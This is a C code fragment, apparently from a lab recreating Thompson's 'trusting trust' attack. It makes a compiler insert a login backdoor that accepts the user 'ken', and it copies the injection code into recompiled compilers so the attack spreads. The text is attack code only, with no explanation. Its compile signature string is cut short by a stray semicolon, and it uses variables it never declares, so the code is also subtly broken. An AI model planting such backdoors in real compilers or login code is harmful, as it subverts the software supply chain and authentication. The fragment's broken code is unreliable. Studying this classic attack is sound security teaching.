static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

static char compile_sig[] = 
    "static void compile(char *program, char *outname) {\n"
    "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
    "    assert(fp);";
    "    fprintf(fp, \"%s\", program);\n"
    "    fclose(fp);";

char *pos;
// write to either login or compile
if ((pos = strstr(program, login_sig))) {
    int prefix_len = pos - program + strlen(login_sig);
    fwrite(program, 1, prefix_len, fp);
    fprintf(fp, "%s", login_attack);
    fprintf(fp, "%s", pos + strlen(login_sig));
} 
else if ((pos = strstr(program, compile_sig))) {
    int prefix_len = pos - program + strlen(compile_sig);
    fwrite(program, 1, prefix_len, fp);
    fprintf(fp, "char prog[] = {\n");
    for (int i = 0; prog[i]; i++)
        fprintf(fp, "%d,", prog[i]);
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", prog);
    fprintf(fp, "fclose(fp);");
    fprintf(fp, "%s", pos + strlen(compile_sig));
}
else {
    fprintf(fp, "%s", program);
}